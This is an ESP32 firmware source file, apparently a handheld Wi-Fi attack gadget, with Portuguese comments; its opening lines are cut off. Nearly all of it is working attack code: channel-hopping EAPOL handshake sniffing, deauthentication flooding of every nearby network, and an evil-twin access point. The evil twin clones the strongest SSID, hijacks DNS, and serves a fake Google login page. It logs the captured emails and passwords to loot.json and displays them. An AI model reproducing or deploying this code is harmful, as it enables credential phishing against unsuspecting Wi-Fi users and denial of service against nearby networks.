#define LED_BLUE 2

enum Mode { MENU, WIFI_SNIFFER, WIFI_DEAUTH, EVIL_TWIN };
Mode currentMode = MENU;
int menuOption = 0;

bool mostrandoLoot = false; 
bool sd_status = false;
int current_ch = 1;
unsigned long last_hop = 0;
unsigned long lastStrobo = 0;
bool stroboState = false;

// --- FUNÇÕES DE HARDWARE ---

void updateStrobo() {
  if (mostrandoLoot) {
    if (millis() - lastStrobo > 150) {
      stroboState = !stroboState;
      digitalWrite(LED_RED, stroboState);
      digitalWrite(LED_BLUE, !stroboState);
      lastStrobo = millis();
    }
  } else {
    digitalWrite(LED_RED, LOW);
    digitalWrite(LED_BLUE, LOW);
  }
}

void drawFooter() {
  display.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 56); display.print(sd_status ? "SD OK" : "SD ERR");
  
  // Exibindo a versão estática v1.0 alinhada à direita
  display.setCursor(65, 56); display.print("C4NG4 v1.0");
}

// --- ARMAZENAMENTO JSON ---

void logToSD(String user, String pw) {
  if (!sd_status) return;
  File logFile = SD.open("/loot.json", FILE_APPEND);
  if (logFile) {
    StaticJsonDocument<200> doc;
    doc["target_ap"] = selectedSSID;
    doc["user"] = user;
    doc["pass"] = pw;
    doc["timestamp"] = millis();
    
    serializeJson(doc, logFile);
    logFile.println(); // Nova linha
    logFile.close();
  }
}

void handleLogin() {
  String user = server.arg("u");
  String pw = server.arg("p");
  logToSD(user, pw);
  
  mostrandoLoot = true; 
  display.clearDisplay();
  display.setCursor(0, 0); 
  display.setTextColor(SSD1306_WHITE);
  display.println(">> GOOGLE CAPTURE <<");
  display.setCursor(0, 15); display.print("Email: "); display.println(user);
  display.setCursor(0, 35); display.print("Pass: "); display.println(pw);
  drawFooter();
  display.display();
  
  server.send(200, "text/html", "<html><script>location.href='https://accounts.google.com';</script></html>");
}

// --- FUNÇÕES DE REDE ---

void resetRadio() {
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  delay(100);
  esp_wifi_start();
  mostrandoLoot = false;
  digitalWrite(LED_RED, LOW);
  digitalWrite(LED_BLUE, LOW);
}

void scanAndSelectSSID() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Scanning APs...");
  drawFooter();
  display.display();

  int n = WiFi.scanNetworks();
  if (n > 0) {
    selectedSSID = WiFi.SSID(0); // Clona o SSID com sinal mais forte
  } else {
    selectedSSID = "Free Wi-Fi";
  }
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  for (uint32_t i = 0; i < pkt->rx_ctrl.sig_len - 1; i++) {
    if (payload[i] == 0x88 && payload[i+1] == 0x8E) handshake_captured = true;
  }
}

// --- MODOS DE OPERAÇÃO ---

void runSniffer() {
  if (millis() - last_hop > 150) {
    current_ch++; if (current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop = millis();
  }
  display.clearDisplay();
  display.setCursor(0,0); display.printf("CH: %d | SNIFFING...", current_ch);
  display.setCursor(0, 20);
  if (handshake_captured) display.println(">> HANDSHAKE OK <<");
  else display.println("Waiting EAPOL...");
  drawFooter(); display.display();
}

void runDeauth() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);
    for(int j=0; j < 45; j++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, sizeof(deauth_pkt), false);
    }
    display.clearDisplay();
    display.setCursor(0,0); display.printf("DEAUTH -> %s", WiFi.SSID(i).substring(0,14).c_str());
    drawFooter(); display.display();
    if (digitalRead(BOOT_BUTTON) == LOW) return;
  }
}

void runEvilTwin() {
  if (WiFi.getMode() != WIFI_AP) {
    scanAndSelectSSID(); // Clona antes de subir a AP
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(selectedSSID.c_str()); 
    
    // DNS redirecionando qualquer domínio para o IP do ESP32
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    // Rota principal (A página falsa do Google)
    server.on("/", []() { server.send(200, "text/html", GOOGLE_HTML); });
    
    // Rota de captura de credenciais
    server.on("/login", handleLogin);
    
    // A MÁGICA DO CAPTIVE PORTAL ACONTECE AQUI
    // Em vez de enviar o HTML no Not Found, nós forçamos um redirecionamento 302
    server.onNotFound([]() { 
      server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
      server.send(302, "text/plain", ""); 
    });

    server.begin();
  }
  
  dnsServer.processNextRequest();
  server.handleClient();
  updateStrobo();

  if (!mostrandoLoot) {
    display.clearDisplay();
    display.setCursor(0,0); 
    display.println("EVIL TWIN ACTIVE");
    display.printf("SSID: %s\n", selectedSSID.substring(0,14).c_str());
    display.printf("Victims: %d", WiFi.softAPgetStationNum());
    drawFooter(); display.display();
  }
}

// --- CONTROLE PRINCIPAL ---

void checkButton() {
  if (digitalRead(BOOT_BUTTON) == LOW) {
    unsigned long st = millis();
    while (digitalRead(BOOT_BUTTON) == LOW);
    if (millis() - st > 1000) { 
      resetRadio(); 
      if (currentMode == MENU) {
        if (menuOption == 0) { currentMode = WIFI_SNIFFER; esp_wifi_set_promiscuous(true); }
        else if (menuOption == 1) currentMode = WIFI_DEAUTH;
        else currentMode = EVIL_TWIN;
      } else {
        currentMode = MENU;
        selectedSSID = "Free Wi-Fi"; // Reseta o nome alvo ao sair
      }
    } else if (currentMode == MENU) {
      menuOption = (menuOption + 1) % 3;
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(BOOT_BUTTON, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT);
  pinMode(LED_BLUE, OUTPUT);
  
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  
  // Logo/Versão de boot forçada para v1.0
  display.setCursor(20, 25); display.println("C4NG4-S3C v1.0");
  display.display();
  
  if (SD.begin(SD_CS)) sd_status = true;
  delay(1500);
  
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
}

void loop() {
  checkButton();
  updateStrobo();
  
  if (currentMode == MENU) {
    display.clearDisplay();
    display.fillRect(0,0,128,12,1); 
    display.setTextColor(0);
    display.setCursor(5,2); display.print("RED TEAM MENU");
    display.setTextColor(1);
    
    for(int i=0; i<3; i++) {
      display.setCursor(10, 18+(i*10));
      if(i==menuOption) display.print("> ");
      display.print(options[i]);
    }
    drawFooter(); display.display();
  } 
  else if (currentMode == WIFI_SNIFFER) runSniffer();
  else if (currentMode == WIFI_DEAUTH) runDeauth();
  else if (currentMode == EVIL_TWIN) runEvilTwin();
}
